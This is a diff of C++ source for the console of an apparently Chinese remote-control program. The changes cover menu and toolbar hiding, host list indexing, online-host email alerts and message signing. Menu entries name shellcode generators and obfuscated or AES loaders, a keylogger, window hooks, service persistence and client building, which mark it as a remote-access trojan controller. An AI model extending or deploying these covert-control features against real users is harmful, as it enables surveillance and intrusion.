+    // --- 文件菜单 (索引0) ---
+    CMenu* pFileMenu = m_MainMenu.GetSubMenu(0);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_SETTINGS, MF_SETTINGS))
+        pFileMenu->DeleteMenu(ID_MAIN_SET, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_NOTIFY_SETTINGS, MF_NOTIFY_SETTINGS))
+        pFileMenu->DeleteMenu(ID_MENU_NOTIFY_SETTINGS, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_WALLET, MF_WALLET))
+        pFileMenu->DeleteMenu(ID_MAIN_WALLET, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_NETWORK, MF_NETWORK))
+        pFileMenu->DeleteMenu(ID_MAIN_NETWORK, MF_BYCOMMAND);
+
+    // --- 工具菜单 (索引1) ---
+    CMenu* pToolMenu = m_MainMenu.GetSubMenu(1);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_INPUT_PASSWORD, MF_INPUT_PASSWORD))
+        pToolMenu->DeleteMenu(ID_TOOL_INPUT_PASSWORD, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_IMPORT_LICENSE, MF_IMPORT_LICENSE))
+        pToolMenu->DeleteMenu(ID_TOOL_IMPORT_LICENSE, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_RCEDIT, MF_RCEDIT))
+        pToolMenu->DeleteMenu(ID_TOOL_RCEDIT, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_GEN_AUTH, MF_GEN_AUTH))
+        pToolMenu->DeleteMenu(ID_TOOL_AUTH, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_GEN_MASTER, MF_GEN_MASTER))
+        pToolMenu->DeleteMenu(ID_TOOL_GEN_MASTER, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_LICENSE_MGR, MF_LICENSE_MGR))
+        pToolMenu->DeleteMenu(ID_TOOL_LICENSE_MGR, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_V2_PRIVATEKEY, MF_V2_PRIVATEKEY))
+        pToolMenu->DeleteMenu(ID_TOOL_V2_PRIVATEKEY, MF_BYCOMMAND);
+
+    // --- 工具菜单 - ShellCode子菜单 ---
+    CMenu* pShellCodeMenu = FindSubMenuByCommand(pToolMenu, ID_TOOL_GEN_SHELLCODE);
+    if (pShellCodeMenu) {
+        if (SHOULD_HIDE_MENU(HIDE_MENU_SHELLCODE_C, MF_SHELLCODE_C))
+            pShellCodeMenu->DeleteMenu(ID_TOOL_GEN_SHELLCODE, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_SHELLCODE_BIN, MF_SHELLCODE_BIN))
+            pShellCodeMenu->DeleteMenu(ID_TOOL_GEN_SHELLCODE_BIN, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_SHELLCODE_LOAD_TEST, MF_SHELLCODE_LOAD_TEST))
+            pShellCodeMenu->DeleteMenu(ID_SHELLCODE_LOAD_TEST, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_SHELLCODE_OBFS, MF_SHELLCODE_OBFS))
+            pShellCodeMenu->DeleteMenu(ID_OBFS_SHELLCODE, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_SHELLCODE_OBFS_BIN, MF_SHELLCODE_OBFS_BIN))
+            pShellCodeMenu->DeleteMenu(ID_OBFS_SHELLCODE_BIN, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_SHELLCODE_OBFS_TEST, MF_SHELLCODE_OBFS_TEST))
+            pShellCodeMenu->DeleteMenu(ID_SHELLCODE_OBFS_LOAD_TEST, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_SHELLCODE_AES_C, MF_SHELLCODE_AES_C))
+            pShellCodeMenu->DeleteMenu(ID_SHELLCODE_AES_C_ARRAY, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_SHELLCODE_AES_BIN, MF_SHELLCODE_AES_BIN))
+            pShellCodeMenu->DeleteMenu(ID_SHELLCODE_AES_BIN, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_SHELLCODE_AES_TEST, MF_SHELLCODE_AES_TEST))
+            pShellCodeMenu->DeleteMenu(ID_SHELLCODE_TEST_AES_BIN, MF_BYCOMMAND);
+        // 如果子菜单为空，删除父级菜单项
+        if (pShellCodeMenu->GetMenuItemCount() == 0) {
+            for (UINT i = 0; i < pToolMenu->GetMenuItemCount(); i++) {
+                if (pToolMenu->GetSubMenu(i) == pShellCodeMenu) {
+                    pToolMenu->DeleteMenu(i, MF_BYPOSITION);
+                    break;
+                }
+            }
+        }
+    }
+
+    // --- 参数菜单 (索引2) ---
+    CMenu* pParamMenu = m_MainMenu.GetSubMenu(2);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_KBLOGGER, MF_KBLOGGER))
+        pParamMenu->DeleteMenu(ID_PARAM_KBLOGGER, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_LOGIN_NOTIFY, MF_LOGIN_NOTIFY))
+        pParamMenu->DeleteMenu(ID_PARAM_LOGIN_NOTIFY, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_ENABLE_LOG, MF_ENABLE_LOG))
+        pParamMenu->DeleteMenu(ID_PARAM_ENABLE_LOG, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_PRIVACY_WALLPAPER, MF_PRIVACY_WALLPAPER))
+        pParamMenu->DeleteMenu(ID_PARAM_PRIVACY_WALLPAPER, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_FILE_V2, MF_FILE_V2))
+        pParamMenu->DeleteMenu(ID_PARAM_FILE_V2, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_HOOK_WIN, MF_HOOK_WIN))
+        pParamMenu->DeleteMenu(ID_HOOK_WIN, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_RUN_AS_SERVICE, MF_RUN_AS_SERVICE))
+        pParamMenu->DeleteMenu(ID_RUNAS_SERVICE, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_RUN_AS_USER, MF_RUN_AS_USER))
+        pParamMenu->DeleteMenu(ID_PARAM_RUN_AS_USER, MF_BYCOMMAND);
+
+    // --- 扩展菜单 (索引3) ---
+    CMenu* pExtMenu = m_MainMenu.GetSubMenu(3);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_HISTORY_CLIENTS, MF_HISTORY_CLIENTS))
+        pExtMenu->DeleteMenu(ID_HISTORY_CLIENTS, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_BACKUP_DATA, MF_BACKUP_DATA))
+        pExtMenu->DeleteMenu(ID_BACKUP_DATA, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_IMPORT_DATA, MF_IMPORT_DATA))
+        pExtMenu->DeleteMenu(ID_IMPORT_DATA, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_RELOAD_PLUGINS, MF_RELOAD_PLUGINS))
+        pExtMenu->DeleteMenu(ID_TOOL_RELOAD_PLUGINS, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_PLUGIN_REQUEST, MF_PLUGIN_REQUEST))
+        pExtMenu->DeleteMenu(ID_PLUGIN_REQUEST, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_FRPS_FOR_SUB, MF_FRPS_FOR_SUB))
+        pExtMenu->DeleteMenu(ID_FRPS_FOR_SUB, MF_BYCOMMAND);
+
+    // --- 扩展菜单 - 语言设置子菜单 ---
+    CMenu* pLangMenu = FindSubMenuByCommand(pExtMenu, ID_CHANGE_LANG);
+    if (pLangMenu) {
+        if (SHOULD_HIDE_MENU(HIDE_MENU_CHANGE_LANG, MF_CHANGE_LANG))
+            pLangMenu->DeleteMenu(ID_CHANGE_LANG, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_CHOOSE_LANG_DIR, MF_CHOOSE_LANG_DIR))
+            pLangMenu->DeleteMenu(ID_CHOOSE_LANG_DIR, MF_BYCOMMAND);
+        if (pLangMenu->GetMenuItemCount() == 0) {
+            for (UINT i = 0; i < pExtMenu->GetMenuItemCount(); i++) {
+                if (pExtMenu->GetSubMenu(i) == pLangMenu) {
+                    pExtMenu->DeleteMenu(i, MF_BYPOSITION);
+                    break;
+                }
+            }
+        }
+    }
+
+    // --- 扩展菜单 - IP定位子菜单 ---
+    CMenu* pLocMenu = FindSubMenuByCommand(pExtMenu, ID_LOCATION_QQWRY);
+    if (pLocMenu) {
+        if (SHOULD_HIDE_MENU(HIDE_MENU_LOCATION_QQWRY, MF_LOCATION_QQWRY))
+            pLocMenu->DeleteMenu(ID_LOCATION_QQWRY, MF_BYCOMMAND);
+        if (SHOULD_HIDE_MENU(HIDE_MENU_LOCATION_IP2REGION, MF_LOCATION_IP2REGION))
+            pLocMenu->DeleteMenu(ID_LOCATION_IP2REGION, MF_BYCOMMAND);
+        if (pLocMenu->GetMenuItemCount() == 0) {
+            for (UINT i = 0; i < pExtMenu->GetMenuItemCount(); i++) {
+                if (pExtMenu->GetSubMenu(i) == pLocMenu) {
+                    pExtMenu->DeleteMenu(i, MF_BYPOSITION);
+                    break;
+                }
+            }
+        }
+    }
+
+    // --- 帮助菜单 (索引4) ---
+    CMenu* pHelpMenu = m_MainMenu.GetSubMenu(4);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_IMPORTANT, MF_IMPORTANT))
+        pHelpMenu->DeleteMenu(ID_HELP_IMPORTANT, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_FEEDBACK, MF_FEEDBACK))
+        pHelpMenu->DeleteMenu(ID_HELP_FEEDBACK, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_WHAT_IS_THIS, MF_WHAT_IS_THIS))
+        pHelpMenu->DeleteMenu(ID_WHAT_IS_THIS, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_MASTER_TRAIL, MF_MASTER_TRAIL))
+        pHelpMenu->DeleteMenu(ID_MASTER_TRAIL, MF_BYCOMMAND);
+    if (SHOULD_HIDE_MENU(HIDE_MENU_REQUEST_AUTH, MF_REQUEST_AUTH))
+        pHelpMenu->DeleteMenu(ID_TOOL_REQUEST_AUTH, MF_BYCOMMAND);
 
     ::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); //为窗口设置菜单
     ::DrawMenuBar(this->GetSafeHwnd());                        //显示菜单
@@ -656,7 +1119,7 @@ VOID CMy2015RemoteDlg::CreateNotifyBar()
     m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //托盘所拥有的状态
     m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //回调消息
     m_Nid.hIcon = m_hIcon;                               //icon 变量
-    CString strTips = _TR("禁界: 远程协助软件");       //气泡提示
+    CString strTips = _TR(BRAND_TRAY_TIP);       //气泡提示
     lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
     Shell_NotifyIcon(NIM_ADD, &m_Nid);   //显示托盘
 }
@@ -695,7 +1158,62 @@ VOID CMy2015RemoteDlg::CreateToolBar()
     m_ToolBar.SetButtonText(9, _TR("键盘记录"));
     m_ToolBar.SetButtonText(10, _TR("参数设置"));
     m_ToolBar.SetButtonText(11, _TR("生成服务端"));
-    m_ToolBar.SetButtonText(12, _TR("帮助"));
+    m_ToolBar.SetButtonText(12, _TR("搜索"));
+    m_ToolBar.SetButtonText(13, _TR("帮助"));
+
+    // ============================================================
+    //  UIBranding: 根据编译时配置或运行时标志隐藏工具栏按钮
+    // ============================================================
+    CToolBarCtrl& tbCtrl = m_ToolBar.GetToolBarCtrl();
+    int hiddenCount = 0;
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_TERMINAL, TF_TERMINAL)) {
+        tbCtrl.HideButton(IDM_ONLINE_CMD, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_PROCESS, TF_PROCESS)) {
+        tbCtrl.HideButton(IDM_ONLINE_PROCESS, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_WINDOW, TF_WINDOW)) {
+        tbCtrl.HideButton(IDM_ONLINE_WINDOW, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_DESKTOP, TF_DESKTOP)) {
+        tbCtrl.HideButton(IDM_ONLINE_DESKTOP, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_FILE, TF_FILE)) {
+        tbCtrl.HideButton(IDM_ONLINE_FILE, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_AUDIO, TF_AUDIO)) {
+        tbCtrl.HideButton(IDM_ONLINE_AUDIO, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_VIDEO, TF_VIDEO)) {
+        tbCtrl.HideButton(IDM_ONLINE_VIDEO, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_SERVICE, TF_SERVICE)) {
+        tbCtrl.HideButton(IDM_ONLINE_SERVER, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_REGISTER, TF_REGISTER)) {
+        tbCtrl.HideButton(IDM_ONLINE_REGISTER, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_KEYBOARD, TF_KEYBOARD)) {
+        tbCtrl.HideButton(IDM_KEYBOARD, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_SETTINGS, TF_SETTINGS)) {
+        tbCtrl.HideButton(ID_MAIN_SET, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_BUILD, TF_BUILD)) {
+        tbCtrl.HideButton(IDM_ONLINE_BUILD, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_SEARCH, TF_SEARCH)) {
+        tbCtrl.HideButton(ID_TOOLBAR_SEARCH, TRUE); hiddenCount++;
+    }
+    if (SHOULD_HIDE_TOOLBAR(HIDE_TOOLBAR_HELP, TF_HELP)) {
+        tbCtrl.HideButton(IDM_ONLINE_ABOUT, TRUE); hiddenCount++;
+    }
+
+    // 如果所有按钮都被隐藏，则隐藏整个工具栏
+    if (hiddenCount >= 14) {
+        m_ToolBar.ShowWindow(SW_HIDE);
+    }
+
     RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示
 }
 
@@ -711,16 +1229,19 @@ VOID CMy2015RemoteDlg::InitControl()
     rect.bottom+=20;
     MoveWindow(rect);
     auto style = LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_DOUBLEBUFFER | LVS_EX_HEADERDRAGDROP | LVS_EX_LABELTIP;
+    // SetVirtualMode 已在 DoDataExchange 中设置
     m_CList_Online.SetConfigKey(_T("OnlineList"));
     for (int i = 0; i<g_Column_Count_Online; ++i) {
         m_CList_Online.AddColumn(i, _L(g_Column_Data_Online[i].szTitle), g_Column_Data_Online[i].nWidth, LVCFMT_CENTER);
         g_Column_Online_Width+=g_Column_Data_Online[i].nWidth;
     }
     m_CList_Online.InitColumns();
-    m_CList_Online.ModifyStyle(0, LVS_SHOWSELALWAYS);
+    m_CList_Online.ModifyStyle(0, LVS_SHOWSELALWAYS);  // LVS_OWNERDATA 由 SetVirtualMode 设置
     m_CList_Online.SetExtendedStyle(style);
     m_CList_Online.SetParent(&m_GroupTab);
     m_CList_Online.ModifyStyle(WS_HSCROLL, 0);
+    // Tab 控件是列表的父窗口，添加 WS_CLIPCHILDREN 防止重绘时覆盖列表
+    m_GroupTab.ModifyStyle(0, WS_CLIPCHILDREN);
 
     for (int i = 0; i < g_Column_Count_Message; ++i) {
         m_CList_Message.InsertColumnL(i, g_Column_Data_Message[i].szTitle, LVCFMT_LEFT,g_Column_Data_Message[i].nWidth);
@@ -763,29 +1284,39 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 
     CString install = v[RES_INSTALL_TIME].empty() ? "?" : v[RES_INSTALL_TIME].c_str();
     CString path = v[RES_FILE_PATH].empty() ? "?" : v[RES_FILE_PATH].c_str();
+
+    // 解析版本字符串: "Feb 26 2026-XXXX" -> 版本="Feb 26 2026", 能力="XXXX"
+    CString verDisplay = ver, capStr;
+    int dashPos = ver.Find('-');
+    if (dashPos > 0) {
+        verDisplay = ver.Left(dashPos);
+        capStr = ver.Mid(dashPos + 1);
+    }
+
     CString data[ONLINELIST_MAX] = { strIP, strAddr, "", strPCName, strOS, strCPU, strVideo, strPing,
-                                     ver, install, startTime, v[RES_CLIENT_TYPE].empty() ? "?" : v[RES_CLIENT_TYPE].c_str(), path,
-                                     v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
+                                     verDisplay, install, startTime, v[RES_CLIENT_TYPE].empty() ? "?" : v[RES_CLIENT_TYPE].c_str(), path,
+                                     v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(), startTime, capStr,
                                    };
     auto id = CONTEXT_OBJECT::CalculateID(data);
-	auto id_str = std::to_string(id);
+    auto id_str = std::to_string(id);
     if (v[RES_CLIENT_ID].empty()) {
-		v[RES_CLIENT_ID] = id_str;
-    }else if (id_str != v[RES_CLIENT_ID]) {
+        v[RES_CLIENT_ID] = id_str;
+    } else if (id_str != v[RES_CLIENT_ID]) {
         Mprintf("上线消息 - 主机ID错误: calc=%llu, recv=%s, IP=%s, Path=%s\n",
-            id, v[RES_CLIENT_ID].c_str(), strIP.GetString(), path.GetString());
+                id, v[RES_CLIENT_ID].c_str(), strIP.GetString(), path.GetString());
     }
-    bool modify = false;
+    bool modify = false, needConvert = true;
     CString loc = m_ClientMap->GetClientMapData(id, MAP_LOCATION);
     if (loc.IsEmpty()) {
         loc = v[RES_CLIENT_LOC].c_str();
         if (loc.IsEmpty()) {
-            IPConverter cvt;
-            loc = cvt.GetGeoLocation(data[ONLINELIST_IP].GetString()).c_str();
+            loc = m_IPConverter->GetGeoLocation(data[ONLINELIST_IP].GetString()).c_str();
+            needConvert = !m_HasLocDB;
         }
     }
-	// TODO: Remove SafeUtf8ToAnsi after migrating to UTF-8
-    loc = SafeUtf8ToAnsi(loc.GetString()).c_str();
+    // TODO: Remove SafeUtf8ToAnsi after migrating to UTF-8
+    if (needConvert)
+        loc = SafeUtf8ToAnsi(loc.GetString()).c_str();
     bool flag = strIP == "127.0.0.1" && !v[RES_CLIENT_PUBIP].empty();
     data[ONLINELIST_IP] = flag ? v[RES_CLIENT_PUBIP].c_str() : strIP;
     data[ONLINELIST_LOCATION] = loc;
@@ -801,42 +1332,72 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
         m_GroupList.insert(groupName);
     }
 
-    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
-        auto ctx = *i;
-        if (ctx == ContextObject) {
-            LeaveCriticalSection(&m_cs);
-            Mprintf("上线消息 - 主机已经存在 [1]: same context. IP= %s\n", data[ONLINELIST_IP]);
-            return;
-        }
-        if (ctx->GetClientID() == id && !ctx->GetClientData(ONLINELIST_IP).IsEmpty()) {
-            LeaveCriticalSection(&m_cs);
-            Mprintf("上线消息 - 主机已经存在 [2]: %llu. IP= %s. Path= %s\n", id, data[ONLINELIST_IP], path);
-            return;
+    // 使用索引快速检查是否已存在
+    auto indexIt = m_ClientIndex.find(id);
+    if (indexIt != m_ClientIndex.end()) {
+        size_t idx = indexIt->second;
+        if (idx < m_HostList.size()) {
+            context* ctx = m_HostList[idx];
+            if (ctx == ContextObject) {
+                LeaveCriticalSection(&m_cs);
+                Mprintf("上线消息 - 主机已经存在 [1]: same context. IP= %s\n", data[ONLINELIST_IP]);
+                return;
+            }
+            if (!ctx->GetClientData(ONLINELIST_IP).IsEmpty()) {
+                Mprintf("上线消息 - 主机已经存在 [2]: %llu. IP= %s. Path= %s\n", id, data[ONLINELIST_IP], path);
+#ifndef _DEBUG
+                LeaveCriticalSection(&m_cs);
+                return;
+#endif
+            }
         }
     }
 
     if (modify)
         m_ClientMap->SaveToFile(GetDbPath());
-    m_HostList.insert(ContextObject);
-    if (groupName == m_selectedGroup || (groupName.empty() && m_selectedGroup == "default")) {
-        int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), data[ONLINELIST_IP]);
-        for (int n = ONLINELIST_ADDR; n <= ONLINELIST_CLIENTTYPE; n++) {
-            auto note = m_ClientMap->GetClientMapData(ContextObject->GetClientID(), MAP_NOTE);
-            n == ONLINELIST_COMPUTER_NAME ?
-            m_CList_Online.SetItemText(i, n, !note.IsEmpty() ? note : data[n]) :
-                          m_CList_Online.SetItemText(i, n, data[n].IsEmpty() ? "?" : data[n]);
-        }
-        m_CList_Online.SetItemData(i, (DWORD_PTR)ContextObject);
+
+    // 添加到列表并更新索引
+    m_ClientIndex[id] = m_HostList.size();
+    m_HostList.push_back(ContextObject);
+    // 通知 Web 服务（批量通知，由定时器触发）
+    if (WebService().IsRunning()) {
+        WebService().MarkDeviceOnline(id);
     }
+    // 加入待处理队列，由定时器批量更新 UI（减少闪烁）
+    if (groupName == m_selectedGroup || (groupName.empty() && m_selectedGroup == "default")) {
+        m_PendingOnline.push_back(ContextObject);
+    }
+
+    // Check if notification should be sent for this host
+    try {
+        std::string matchedKeyword;
+        CString remark = m_ClientMap->GetClientMapData(ContextObject->GetClientID(), MAP_NOTE);
+        if (GetNotifyManager().ShouldNotify(ContextObject, matchedKeyword, remark)) {
+            std::string subject, body;
+            GetNotifyManager().BuildHostOnlineEmail(ContextObject, matchedKeyword, subject, body);
+            GetNotifyManager().SendNotifyEmailAsync(subject, body);
+        }
+    } catch (...) {
+        Mprintf("[Notify] Exception in notification check\n");
+    }
+
     std::string tip = flag ? " (" + v[RES_CLIENT_PUBIP] + ") " : "";
-    ShowMessage(_TR("操作成功"), strIP + tip.c_str() + " " + _L(_T("主机上线")) + "[" + loc + "]");
+    ShowMessage(_TR("操作成功"), strIP + tip.c_str() + " " + _L(_T("主机上线")) + "[" + loc + "][" + groupName.c_str() + "]");
 
     CharMsg *title =  new CharMsg(_TR("主机上线"));
     CharMsg *text = new CharMsg(strIP + CString(tip.c_str()) + _T(" ") + _L(_T("主机上线")) + _T(" [") + loc + _T("]"));
+    // sign login message to let client verify the message is from trusted source
+    std::string signMessage(const std::string & privateKey, BYTE * msg, int len);
+    MasterSettings copy = m_settings;
+    std::string msg = startTime;
+    msg += "|" + std::to_string(ContextObject->GetClientID());
+    auto signature = signMessage("", (BYTE*)msg.c_str(), msg.length());
+    ASSERT(signature.size() <= sizeof(copy.Signature));
+    memcpy(copy.Signature, signature.data(), signature.size());
     LeaveCriticalSection(&m_cs);
-    Mprintf("主机[%s]上线: %s[%s]\n", v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
-            std::to_string(id).c_str(), loc);
-    SendMasterSettings(ContextObject);
+    Mprintf("主机[%s]上线: %s[%s][%s]\n", v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
+            std::to_string(id).c_str(), loc, groupName.c_str());
+    SendMasterSettings(ContextObject, copy);
     if (m_needNotify && (GetTickCount() - g_StartTick > 30*1000))
         PostMessageA(WM_SHOWNOTIFY, WPARAM(title), LPARAM(text));
     else {
@@ -869,7 +1430,7 @@ LRESULT CMy2015RemoteDlg::OnShowMessage(WPARAM wParam, LPARAM lParam)
 {
     if (wParam && !lParam) {
         CharMsg* msg = (CharMsg*)wParam;
-        ShowMessage(_TR("提示信息"), msg->data);
+        ShowMessage(_TR("提示信息"), _L(msg->data));
         if (msg->needFree) delete msg;
         return S_OK;
     }
@@ -887,11 +1448,20 @@ LRESULT CMy2015RemoteDlg::OnShowMessage(WPARAM wParam, LPARAM lParam)
     return S_OK;
 }
 
+// 消息日志最大条数，达到上限时删除最旧的记录
+#define MAX_MESSAGE_COUNT 1000
+
 VOID CMy2015RemoteDlg::ShowMessage(CString strType, CString strMsg)
 {
     AUTO_TICK(200, "");
     CTime Timer = CTime::GetCurrentTime();
-    CString strTime= Timer.FormatL("%H:%M:%S");
+    CString strTime = Timer.Format("%Y-%m-%d %H:%M:%S");
+
+    // 达到上限时删除最旧的记录
+    int count = m_CList_Message.GetItemCount();
+    if (count >= MAX_MESSAGE_COUNT) {
+        m_CList_Message.DeleteItem(count - 1);
+    }
 
     m_CList_Message.InsertItem(0, strType);    //向控件中设置数据
     m_CList_Message.SetItemText(0,1,strTime);
@@ -901,9 +1471,11 @@ VOID CMy2015RemoteDlg::ShowMessage(CString strType, CString strMsg)
 
     EnterCriticalSection(&m_cs);
     int m_iCount = m_CList_Online.GetItemCount();
+	int totalCount = m_HostList.size();
     LeaveCriticalSection(&m_cs);
 
     strStatusMsg.FormatL("有%d个主机在线",m_iCount);
+    strStatusMsg += CString("[Total: ") + std::to_string(totalCount).c_str() + "]";
     if (m_StatusBar.GetSafeHwnd())
         m_StatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字
 }
@@ -914,11 +1486,17 @@ LRESULT CMy2015RemoteDlg::OnShowErrMessage(WPARAM wParam, LPARAM lParam)
     CString* title = (CString*)lParam;
 
     CTime Timer = CTime::GetCurrentTime();
-    CString strTime = Timer.FormatL("%H:%M:%S");
+    CString strTime = Timer.FormatL("%Y-%m-%d %H:%M:%S");
 
-    m_CList_Message.InsertItem(0, title ? *title : _TR("操作错误"));
+    // 达到上限时删除最旧的记录
+    int count = m_CList_Message.GetItemCount();
+    if (count >= MAX_MESSAGE_COUNT) {
+        m_CList_Message.DeleteItem(count - 1);
+    }
+
+    m_CList_Message.InsertItem(0, title ? _L(*title) : _TR("操作错误"));
     m_CList_Message.SetItemText(0, 1, strTime);
-    m_CList_Message.SetItemText(0, 2, text ? *text : _TR("内部错误"));
+    m_CList_Message.SetItemText(0, 2, text ? _L(*text) : _TR("内部错误"));
     if(title)delete title;
     if(text)delete text;
 
@@ -949,13 +1527,14 @@ bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuff
     return false;
 }
 
-Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="")
+Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="", bool isTiny=false)
 {
     BYTE* szBuffer = NULL;
     int dwFileSize = 0;
 
     // 查找名为 MY_BINARY_FILE 的 BINARY 类型资源
-    auto id = is64Bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86;
+    auto id = !isTiny ? (is64Bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86) : 
+        (is64Bit ? IDR_TINYRUN_X64 : IDR_TINYRUN_X86);
     HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
     if (hResource == NULL) {
         return NULL;
@@ -1114,28 +1693,87 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     do { \
         CSplashDlg* pSplash = THIS_APP->GetSplash(); \
         if (pSplash && pSplash->GetSafeHwnd()) { \
-            pSplash->UpdateProgressDirect(percent, _T(text)); \
+            pSplash->UpdateProgressDirect(percent, _TR(text)); \
         } \
     } while(0)
 
+    Mprintf("Program upper master is: %s\n", getUpperHash().c_str());
+
+    const char *env = getenv(BRAND_ENV_VAR);
+    m_superPass = env ? env : THIS_CFG.GetStr("settings", "superAdmin");
+    if (m_superPass.empty()) {
+		PostMessage(WM_SHOWMESSAGE, WPARAM(new CharMsg(_TR("请设置环境变量 " BRAND_ENV_VAR " 来给下级授权"))), 0);
+    }
     AUTO_TICK(500, "");
     __super::OnInitDialog();
 
+    InitializeCriticalSection(&m_DllRateLimitLock);  // DLL 请求限流
+
+    // 添加 WS_CLIPCHILDREN 样式，防止父窗口重绘时覆盖子控件，减少闪烁
+    ModifyStyle(0, WS_CLIPCHILDREN);
+
     UPDATE_SPLASH(15, "正在注册主控信息...");
     THIS_CFG.SetStr("settings", "MainWnd", std::to_string((uint64_t)GetSafeHwnd()));
-    THIS_CFG.SetStr("settings", "SN", getDeviceID(GetHardwareID()));
-    THIS_CFG.SetStr("settings", "PwdHash", GetPwdHash());
-    THIS_CFG.SetStr("settings", "MasterHash", GetMasterHash());
 
-    UPDATE_SPLASH(16, "正在启动下载服务...");
-    m_FileServer = new FileDownloadServer(THIS_CFG.GetInt("settings", "FileSvrPort", 80));
-    if (!m_FileServer->Start()) {
-        THIS_APP->MessageBox(_TR("下载服务启动失败，可能是端口被占用了。"), _TR("提示"), MB_ICONINFORMATION);
+    // SN generation with backward compatibility:
+    // - Existing users (have SN): keep original SN unchanged
+    // - New users: use V2 (includes UUID + MachineGuid for VPS uniqueness)
+    std::string existingSN = THIS_CFG.GetStr("settings", "SN", "");
+    if (existingSN.empty()) {
